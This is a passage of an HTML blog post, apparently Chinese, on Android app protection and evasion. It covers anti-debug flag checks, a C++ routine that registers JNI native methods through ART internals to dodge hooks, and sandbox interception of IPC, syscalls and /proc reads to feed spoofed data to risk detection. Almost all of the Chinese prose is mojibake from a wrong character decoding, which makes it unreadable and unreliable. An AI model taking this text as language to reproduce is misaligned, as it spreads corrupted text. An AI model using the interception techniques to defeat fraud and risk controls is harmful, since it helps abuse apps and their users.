ç§’å¯¹çº¿ç¨‹è¿›è¡Œä¸€äº›ç‰¹å¾è¿›è¡Œæ£€æŸ¥å½“å‰è¿›ç¨‹æ˜¯å¦è¢«è°ƒè¯•</p><p>æœ‰å¾ˆå¤šæ”»å‡»è€…ä¼š<code>Hook</code>çº¿ç¨‹åˆ›å»ºçš„åŠæ³•ï¼Œç„¶ååœ¨çº¿ç¨‹å¯åŠ¨çš„æ—¶å€™è¿›è¡Œ<code>pass</code>ï¼Œä¸è®©å…¶å¯åŠ¨ï¼Œä»¥å®ç°é€ƒè¿‡æ£€æµ‹çš„åŠæ³•</p><p>è¿™ç§æƒ…å†µå…¶å®å¯¹æŠ—ä¹Ÿå¾ˆç®€å•ï¼Œå¯ä»¥åœ¨ä¸»çº¿ç¨‹æä¸ª<code>flag</code>ï¼Œåªæœ‰åœ¨è°ƒè¯•çº¿ç¨‹å¼€å¯çš„æ—¶å€™ï¼Œå¹¶ä¸”æ£€æµ‹æ‰§è¡ŒæˆåŠŸçš„æ—¶å€™ä½¿ç”¨<code>process_vm_writev</code>å¯¹<code>flag</code>è¿›è¡Œå†™å…¥</p><p>å› ä¸ºæ˜¯å¼‚æ­¥ï¼Œæ‰€ä»¥ä¸»çº¿ç¨‹å¯ä»¥å»¶è¿Ÿ2ç§’é’Ÿå¯¹è¿™ä¸ª<code>flag</code>è¿›è¡Œæ£€æµ‹ï¼Œåˆ¤æ–­è°ƒè¯•çº¿ç¨‹æ˜¯å¦å¼€å¯ï¼Œå¦‚æœæ²¡å¼€å¯ä¸ŠæŠ¥åŸ‹ç‚¹å³å¯</p><h4 id="è‡ªå®ç°RegisterNativeMethod"><a href="#è‡ªå®ç°RegisterNativeMethod" class="headerlink" title="è‡ªå®ç°RegisterNativeMethod"></a>è‡ªå®ç°RegisterNativeMethod</h4><p>æˆ‘ä»¬æ­£å¸¸æ³¨å†Œä¸€ä¸ªnativeæ–¹æ³•æ˜¯è°ƒç”¨çš„<code>env-&gt;RegisterNatives</code> ï¼Œä½†æ˜¯è¿™ç§ç›´æ¥apiè°ƒç”¨å¾ˆæœ‰å¯èƒ½è¢«Hook</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå·±å®ç°ä¸€ä»½ ï¼Œå› ä¸ºnativeæ³¨å†Œåº•å±‚æœ¬è´¨ä¸Šæ˜¯ç»™<code>artmethod</code>é‡Œé¢çš„<code>fnptr</code>è¿›è¡Œèµ‹å€¼ï¼Œæœ€ç»ˆè°ƒç”¨<code>artmethod</code>é‡Œé¢çš„<code>RegisterNative</code>æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸ç›´æ¥è°ƒç”¨<code>Jni</code>ç›´æ¥èµ°<code>artmethod</code>é‡Œé¢çš„æ³¨å†Œæ–¹æ³•</p><p>å…·ä½“å®ç°å¦‚ä¸‹ï¼Œå› ä¸º<code>artmethod</code>é‡Œé¢çš„æ³¨å†Œæ–¹æ³•æ¯ä¸ªç‰ˆæœ¬çš„å®ç°éƒ½ä¸ä¸€æ · ï¼Œæ‰€ä»¥è¿™å—éœ€è¦æ ¹æ®ä¸åŒç‰ˆæœ¬è¿›è¡Œ<code>case</code>åˆ†å‘ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//call art method register</span><br><span class="line">if (!RegisterNativeMethod(env, NativeEngine,</span><br><span class="line">                          SignatureFixMethods,</span><br><span class="line">                          sizeof(SignatureFixMethods) / sizeof(SignatureFixMethods[0]))) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; &quot;JNI_OnLoad call art method register fail ,start env register natives! &quot;;</span><br><span class="line"> </span><br><span class="line">    env-&gt;RegisterNatives(NativeEngine,</span><br><span class="line">                         SignatureFixMethods,</span><br><span class="line">                         sizeof(SignatureFixMethods) / sizeof(SignatureFixMethods[0]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çš„è¯å¾ˆç®€å•ç›´æ¥å°è¯•è°ƒç”¨æˆ‘ä»¬è‡ªå·±å®ç°çš„æ–¹æ³•ï¼Œå¦‚æœå¤±è´¥äº†åˆ™è°ƒç”¨ç³»ç»Ÿçš„api ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆé˜²æ­¢<code>jni</code>è¢«<code>hook</code>å®ç°ï¼Œ<code>jni RegisterNative</code> å‡½æ•°è¢«ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Created by Zhenxi on 2022/8/22.</span><br><span class="line">//</span><br><span class="line"> </span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"> </span><br><span class="line">#include &quot;../include/logging.h&quot;</span><br><span class="line">#include &quot;../include/libpath.h&quot;</span><br><span class="line">#include &quot;../include/dlfcn_compat.h&quot;</span><br><span class="line">#include &quot;../include/version.h&quot;</span><br><span class="line">#include &quot;../include/main.h&quot;</span><br><span class="line"> </span><br><span class="line">static void *art_method_register = nullptr;</span><br><span class="line"> </span><br><span class="line">static void *class_linker_ = nullptr;</span><br><span class="line"> </span><br><span class="line">size_t OffsetOfJavaVm(bool has_small_irt, int SDK_INT) &#123;</span><br><span class="line"> </span><br><span class="line">    if (has_small_irt) &#123;</span><br><span class="line">        switch (SDK_INT) &#123;</span><br><span class="line">            case ANDROID_T:</span><br><span class="line">            case ANDROID_SL:</span><br><span class="line">            case ANDROID_S:</span><br><span class="line">                return sizeof(void *) == 8 ? 624 : 300;</span><br><span class="line">            case ANDROID_R:</span><br><span class="line">            case ANDROID_Q:</span><br><span class="line">                return sizeof(void *) == 8 ? 528 : 304;</span><br><span class="line">            default:</span><br><span class="line">                LOGE(&quot;OffsetOfJavaVM Unexpected android version %d&quot;, SDK_INT);</span><br><span class="line">                abort();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        switch (SDK_INT) &#123;</span><br><span class="line">            case ANDROID_T:</span><br><span class="line">            case ANDROID_SL:</span><br><span class="line">            case ANDROID_S:</span><br><span class="line">                return sizeof(void *) == 8 ? 520 : 300;</span><br><span class="line">            case ANDROID_R:</span><br><span class="line">            case ANDROID_Q:</span><br><span class="line">                return sizeof(void *) == 8 ? 496 : 288;</span><br><span class="line">            default:</span><br><span class="line">                LOGE(&quot;OffsetOfJavaVM Unexpected android version %d&quot;, SDK_INT);</span><br><span class="line">                abort();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">int findOffset(void *start, size_t len, size_t step, T value) &#123;</span><br><span class="line"> </span><br><span class="line">    if (nullptr == start) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    for (int i = 0; i &lt;= len; i += step) &#123;</span><br><span class="line">        T current_value = *reinterpret_cast&lt;T *&gt;((size_t) start + i);</span><br><span class="line">        if (value == current_value) &#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/**</span><br><span class="line">* æ ¹æ®runtimeè·å–class_linker</span><br><span class="line">* https://github.com/magician8520/BlackBox/blob/99f26925aa303fd0a71543e3713ef3fc57a08e81/Bcore/pine-core/src/main/cpp/android.h#L36</span><br><span class="line">*/</span><br><span class="line">void *getClassLinker() &#123;</span><br><span class="line">    if (class_linker_ != nullptr) &#123;</span><br><span class="line">        return class_linker_;</span><br><span class="line">    &#125;</span><br><span class="line">    int SDK_INT = get_sdk_level();</span><br><span class="line">    // If SmallIrtAllocator symbols can be found, then the ROM has merged commit &quot;Initially allocate smaller local IRT&quot;</span><br><span class="line">    // This commit added a pointer member between `class_linker_` and `java_vm_`. Need to calibrate offset here.</span><br><span class="line">    // https://android.googlesource.com/platform/art/+/4dcac3629ea5925e47b522073f3c49420e998911</span><br><span class="line">    // https://github.com/crdroidandroid/android_art/commit/aa7999027fa830d0419c9518ab56ceb7fcf6f7f1</span><br><span class="line">    bool has_smaller_irt = getSymCompat(getlibArtPath(),</span><br><span class="line">                                        &quot;_ZN3art17SmallIrtAllocator10DeallocateEPNS_8IrtEntryE&quot;) !=</span><br><span class="line">                           nullptr;</span><br><span class="line">    size_t jvm_offset = OffsetOfJavaVm(has_smaller_irt, SDK_INT);</span><br><span class="line">    auto runtime_instance_ = *reinterpret_cast&lt;void **&gt;</span><br><span class="line">    (getSymCompat(getlibArtPath(), &quot;_ZN3art7Runtime9instance_E&quot;));</span><br><span class="line"> </span><br><span class="line">    auto val = jvm_offset</span><br><span class="line">               ? reinterpret_cast&lt;std::unique_ptr&lt;JavaVM&gt; *&gt;(</span><br><span class="line">                       reinterpret_cast&lt;uintptr_t&gt;(runtime_instance_) + jvm_offset)-&gt;get()</span><br><span class="line">               : nullptr;</span><br><span class="line">    if (val == getVm()) &#123;</span><br><span class="line">        LOGD(&quot;JavaVM offset matches the default offset&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        LOGW(&quot;JavaVM offset mismatches the default offset, try search the memory of Runtime&quot;);</span><br><span class="line">        int offset = findOffset(runtime_instance_, 1024, 4, getVm());</span><br><span class="line">        if (offset == -1) &#123;</span><br><span class="line">            LOGE(&quot;Failed to find java vm from Runtime&quot;);</span><br><span class="line">            return nullptr;</span><br><span class="line">        &#125;</span><br><span class="line">        jvm_offset = offset;</span><br><span class="line">        LOGW(&quot;Found JavaVM in Runtime at %zu&quot;, jvm_offset);</span><br><span class="line">    &#125;</span><br><span class="line">    const size_t kDifference = has_smaller_irt</span><br><span class="line">                               ? sizeof(std::unique_ptr&lt;void&gt;) + sizeof(void *) * 3</span><br><span class="line">                               : SDK_INT == ANDROID_Q</span><br><span class="line">                                 ? sizeof(void *) * 2</span><br><span class="line">                                 : sizeof(std::unique_ptr&lt;void&gt;) + sizeof(void *) * 2;</span><br><span class="line"> </span><br><span class="line">    class_linker_ = *reinterpret_cast&lt;void **&gt;(reinterpret_cast&lt;uintptr_t&gt;(runtime_instance_) +</span><br><span class="line">                                               jvm_offset - kDifference);</span><br><span class="line">    return class_linker_;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">bool call_MethodRegister(JNIEnv *env, void *art_method, void *native_method) &#123;</span><br><span class="line">    if (art_method_register == nullptr) &#123;</span><br><span class="line">        if (get_sdk_level() &lt; ANDROID_S) &#123;</span><br><span class="line">            //android 11</span><br><span class="line">            art_method_register = getSymCompat(getlibArtPath(),</span><br><span class="line">                                               &quot;_ZN3art9ArtMethod14RegisterNativeEPKv&quot;);</span><br><span class="line">            if (art_method_register == nullptr) &#123;</span><br><span class="line">                art_method_register = getSymCompat(getlibArtPath(),</span><br><span class="line">                                                   &quot;_ZN3art9ArtMethod14RegisterNativeEPKvb&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //12ä»¥ä¸Šè¿˜æ˜¯åœ¨libarté‡Œé¢,ä½†æ˜¯åœ¨linkeré‡Œé¢å®ç°,ç¬¦å·åç§°å­˜åœ¨å˜åŒ–</span><br><span class="line">            art_method_register = getSymCompat(getlibArtPath(),</span><br><span class="line">                                               &quot;_ZN3art11ClassLinker14RegisterNativeEPNS_6ThreadEPNS_9ArtMethodEPKv&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (art_method_register == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method  get art_method_register = null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (get_sdk_level() &gt;= ANDROID_S) &#123;</span><br><span class="line">        //12ä»¥ä¸Š</span><br><span class="line">        //const void* RegisterNative(Thread* self, ArtMethod* method, const void* native_method)</span><br><span class="line">        auto call = reinterpret_cast&lt;void *(*)(void *, void *, void *,</span><br><span class="line">                                               void *)&gt;(art_method_register);</span><br><span class="line">        //get self thread</span><br><span class="line">        void *self = getSymCompat(getlibArtPath(), &quot;_ZN3art6Thread14CurrentFromGdbEv&quot;);</span><br><span class="line">        if (self == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method  get CurrentFromGdb = null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //æ‰‹åŠ¨è®¡ç®—ä¸€ä¸‹linkerå®ä¾‹åœ°å€</span><br><span class="line">        void *classLinker = getClassLinker();</span><br><span class="line">        if (classLinker == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method  get getClassLinker = null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        call(classLinker, self, art_method, native_method);</span><br><span class="line">        //LOG(ERROR) &lt;&lt; &quot;register native method  get getClassLinker success!  &quot;;</span><br><span class="line">    &#125; else if (get_sdk_level() &gt;= ANDROID_R) &#123;</span><br><span class="line">        auto call = reinterpret_cast&lt;void *(*)(void *, void *)&gt;(art_method_register);</span><br><span class="line">        call(art_method, native_method);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        auto call = reinterpret_cast&lt;void *(*)(void *, void *, bool)&gt;(art_method_register);</span><br><span class="line">        call(art_method, native_method, true);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">inline static bool IsIndexId(jmethodID mid) &#123;</span><br><span class="line">    return ((reinterpret_cast&lt;uintptr_t&gt;(mid) % 2) != 0);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static jfieldID field_art_method = nullptr;</span><br><span class="line"> </span><br><span class="line">bool RegisterNativeMethod(JNIEnv *env,</span><br><span class="line">                          jclass clazz,</span><br><span class="line">                          const JNINativeMethod *methods,</span><br><span class="line">                          size_t nMethods) &#123;</span><br><span class="line">    if (env == nullptr) &#123;</span><br><span class="line">        LOG(ERROR) &lt;&lt; &quot;register native method  JNIEnv = null  &quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    void *arm_method = nullptr;</span><br><span class="line"> </span><br><span class="line">    for (int i = 0; i &lt; nMethods; i++) &#123;</span><br><span class="line">        jmethodID methodId = env-&gt;GetMethodID(clazz, methods[i].name, methods[i].signature);</span><br><span class="line">        if (methodId == nullptr) &#123;</span><br><span class="line">            //maybe static</span><br><span class="line">            env-&gt;ExceptionClear();</span><br><span class="line">            methodId = env-&gt;GetStaticMethodID(clazz, methods[i].name, methods[i].signature);</span><br><span class="line">            if (methodId == nullptr) &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; &quot;register native method  get orig method  == null  &quot;</span><br><span class="line">                           &lt;&lt; methods[i].signature;</span><br><span class="line">                env-&gt;ExceptionClear();</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (get_sdk_level() &gt;= ANDROID_R) &#123;</span><br><span class="line">            if (field_art_method == nullptr) &#123;</span><br><span class="line">                jclass pClazz = env-&gt;FindClass(&quot;java/lang/reflect/Executable&quot;);</span><br><span class="line">                field_art_method = env-&gt;GetFieldID(pClazz, &quot;artMethod&quot;, &quot;J&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if (field_art_method == nullptr) &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; &quot;register native method  get artMethod  == null  &quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            if (IsIndexId(methodId)) &#123;</span><br><span class="line">                jobject method = env-&gt;ToReflectedMethod(clazz, methodId, true);</span><br><span class="line">                arm_method = reinterpret_cast&lt;void *&gt;(env-&gt;GetLongField(method, field_art_method));</span><br><span class="line">                //LOG(ERROR) &lt;&lt; &quot;arm_method   &quot;&lt;&lt;arm_method ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            arm_method = methodId;</span><br><span class="line">        &#125;</span><br><span class="line">        if (arm_method == nullptr) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method art method  == null  &quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!call_MethodRegister(env, arm_method, methods[i].fnPtr)) &#123;</span><br><span class="line">            LOG(ERROR) &lt;&lt; &quot;register native method fail  &quot; &lt;&lt;</span><br><span class="line">                       methods[i].name &lt;&lt; &quot;  &quot; &lt;&lt; methods[i].signature;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">//        LOG(INFO) &lt;&lt; &quot;register native method success  &quot; &lt;&lt; methods[i].name &lt;&lt; &quot;  &quot;</span><br><span class="line">//                  &lt;&lt; methods[i].signature;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç‰ºç‰²ç¨³å®šæ€§å’Œå¯ç§»æ¤æ€§æ¥æ¢å–é«˜åº¦çš„éšè”½æ€§</p><h3 id="æ— Rootæƒ…å†µå®¢æˆ·ç«¯å¯¹æŠ—çš„è¾¹ç•Œå€¼"><a href="#æ— Rootæƒ…å†µå®¢æˆ·ç«¯å¯¹æŠ—çš„è¾¹ç•Œå€¼" class="headerlink" title="æ— Rootæƒ…å†µå®¢æˆ·ç«¯å¯¹æŠ—çš„è¾¹ç•Œå€¼"></a>æ— Rootæƒ…å†µå®¢æˆ·ç«¯å¯¹æŠ—çš„è¾¹ç•Œå€¼</h3><p>å¦‚æœåœ¨ä¸Rootçš„æƒ…å†µä¸‹ï¼Œæ³¨å…¥æ–¹æ³•ä¸»è¦ä¸¤ç§ï¼Œé‡æ‰“åŒ…æˆ–è€…æŠŠApkæ”¾åˆ°æ²™ç®±é‡Œé¢</p><p>ä¸»è¦çš„ä¸‰ä¸ªæ ¸å¿ƒåŠŸèƒ½ç»„æˆæ°´æ¡¶æœ¨æ¿åˆ†åˆ«å¦‚ä¸‹</p><ul><li>è®¾å¤‡æŒ‡çº¹</li><li>ç¯å¢ƒ&amp;é£é™©æ£€æµ‹èƒ½åŠ›</li><li>ä»£ç é˜²æŠ¤</li></ul><p>ç¬¬ä¸€é¡¹æ¯ä¸ªå¤§å‚éƒ½ä¸ä¸€æ ·ï¼Œ<strong>æ ¹æ®ä¸åŒçš„ç­–ç•¥æ¯ä¸ªå­—æ®µçš„æ¯”é‡å æ¯”ä¹Ÿéƒ½ä¸ä¸€æ ·</strong> ã€‚</p><p>æŠŠä¸€äº›å¸¸è§çš„æˆ–è€…ç¬¬ä¸€ç¯‡å’Œç¬¬äºŒç¯‡æåˆ°çš„å¯¹ç€æ”¹ä¸€ä¸‹å³å¯</p><p>ç¬¬ä¸‰é¡¹ç°åœ¨Soå±‚åŸºæœ¬å¤§å‚éƒ½å·®ä¸å¤šï¼Œéƒ½æ˜¯å„ç§æ··æ·†é…åˆæ§åˆ¶æµ ï¼Œä½†æ˜¯Javaå±‚é˜²æŠ¤åšçš„ä¸å¤Ÿï¼Œå‚è€ƒ<a href="https://bbs.kanxue.com/thread-255514.htm%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BA%9F%E6%8E%89Jadx%E5%8F%8D%E7%BC%96%E8%AF%91%E8%BD%AF%E4%BB%B6">https://bbs.kanxue.com/thread-255514.htmï¼Œå¯ä»¥ç›´æ¥åºŸæ‰Jadxåç¼–è¯‘è½¯ä»¶</a> </p><p>è¿™å—é‡ç‚¹ä»‹ç»ä¸€ä¸‹ç¬¬äºŒé¡¹ï¼ŒåŒ…æ‹¬ä¸€äº›å¸¸è§çš„å­é¡¹ ï¼Œæ¯ä¸ªå­é¡¹è¿˜å¯ä»¥ç»§ç»­åˆ’åˆ†å„ç§æ£€æµ‹æ–¹å¼ ã€‚</p><ul><li>ç¯å¢ƒ&amp;é£é™©æ£€æµ‹èƒ½åŠ›<ul><li>é‡æ‰“åŒ…æ£€æµ‹èƒ½åŠ›</li><li>Hookæ£€æµ‹èƒ½åŠ› ã€‚</li><li>æ¨¡æ‹Ÿå™¨&amp;äº‘æ‰‹æœº&amp;è‡ªå®šä¹‰ROMæ£€æµ‹èƒ½åŠ›</li><li>å¤šå¼€&amp;æ²™ç®±æ£€æµ‹èƒ½åŠ›</li><li>é£é™©Apkæ£€æµ‹èƒ½åŠ›</li></ul></li></ul><p>ä¸Šé¢è¯´çš„è¿™å‡ é¡¹ä¾¿æ˜¯ä¸åŒâ€æ°”å‘³â€œçš„ç»„æˆéƒ¨åˆ†ï¼Œè€Œè¿™ä¸ªâ€æ°”å‘³â€<strong>é‡‡é›†æ–¹å¼çš„è¾¹ç•Œå€¼</strong>åˆåˆ†ä¸ºä¸‰éƒ¨åˆ† ã€‚</p><ul><li><strong>Javaå±‚å°±æ˜¯IPCåè®®</strong> ï¼Œå› ä¸º<strong>IPCåè®®æ˜¯å½“å‰è¿›ç¨‹å¯ä»¥æ“ä½œçš„æœ€åä¸€ä¸ªæ–¹æ³•</strong> ã€‚å‰©ä¸‹çš„å°±æ˜¯æœåŠ¡ç«¯ç»™å–‚æ•°æ®äº†ã€‚</li><li><strong>Nativeå±‚å°±æ˜¯SVCæ‹¦æˆª</strong>ï¼Œå› ä¸ºSVCæ˜¯Linuxè¿›å…¥å†…æ ¸çš„æœ€åä¸€æ¡æŒ‡ä»¤ã€‚</li><li>è¿˜æœ‰ä¸€ç§æ˜¯<strong>è¯»æ–‡ä»¶</strong> ï¼Œè¿™å—åŒºåˆ†æˆä¸¤éƒ¨åˆ†<ul><li><strong>è¿›ç¨‹æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯&#x2F;proc&#x2F;ä¸‹é¢çš„</strong></li><li><strong>ç³»ç»Ÿæ–‡ä»¶ï¼Œç³»ç»Ÿæä¾›çš„ä¸€äº›æ–‡ä»¶å¯ä¾›è¯»å–ã€‚</strong></li></ul></li></ul><p>å¥½ ï¼Œæ ¹æ®ä¸Šé¢çš„æ€»ç»“ï¼Œ<strong>åªè¦æˆ‘ä»¬åœ¨ä¸Šé¢çš„ä¸‰ä¸ªè¾¹ç•Œå€¼è¿›è¡Œæ‹¦æˆªç†è®ºä¸Šå°±æ˜¯æœ€å®Œç¾çš„æ–¹æ¡ˆ ã€‚</strong></p><h3 id="â€œè¾¹ç•Œå€¼â€æ‹¦æˆªæŠ€æœ¯å®ç°ï¼š"><a href="#â€œè¾¹ç•Œå€¼â€æ‹¦æˆªæŠ€æœ¯å®ç°ï¼š" class="headerlink" title="â€œè¾¹ç•Œå€¼â€æ‹¦æˆªæŠ€æœ¯å®ç°ï¼š"></a>â€œè¾¹ç•Œå€¼â€æ‹¦æˆªæŠ€æœ¯å®ç°ï¼š</h3><p>ä¸‹é¢çš„æ¶å­æ˜¯çæƒœå¤§ä½¬çš„æ²™ç®±çš„è®¾è®¡æ¨¡å¼ ï¼Œè¿™å—ä¹Ÿæ˜¯åˆ†äº«ä¸€ä¸‹å¯¹åº”çš„â€œæ¶æ„â€ ã€‚</p><h4 id="IPCåè®®æ‹¦æˆªï¼š"><a href="#IPCåè®®æ‹¦æˆªï¼š" class="headerlink" title="IPCåè®®æ‹¦æˆªï¼š"></a>IPCåè®®æ‹¦æˆªï¼š</h4><p>å…ˆè¯´IPCï¼ŒIPCçš„è¯å¾ˆç®€å•ï¼Œæˆ‘åœ¨ä¸Šé¢ä¹Ÿè¯´äº†å¯ä»¥åŠ¨æ€ä»£ç†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å»ç”¨Hookæ¡†æ¶<code>Hook binder</code>é‡Œé¢çš„äº¤äº’æ–¹æ³• ã€‚å½“å‘ç°è§¦å‘æŒ‡å®šçš„IPCåè®®çš„æ—¶å€™ï¼Œç›´æ¥æ¨¡æ‹ŸæœåŠ¡ç«¯å¾€é‡Œé¢å†™å…¥å³å¯ã€‚</p><p>è¿™å—è¿˜æœ‰ä¸ªç»†èŠ‚ç‚¹ï¼Œä¸ºäº†é˜²æ­¢ç¨‹åºç›´æ¥é€šè¿‡<code>cache</code>è·å–ï¼Œå› ä¸ºæœ‰çš„å­—æ®µåˆå§‹åŒ–ä»¥åå¯èƒ½è¢«ä¿å­˜åˆ°<code>cache</code>é‡Œé¢ 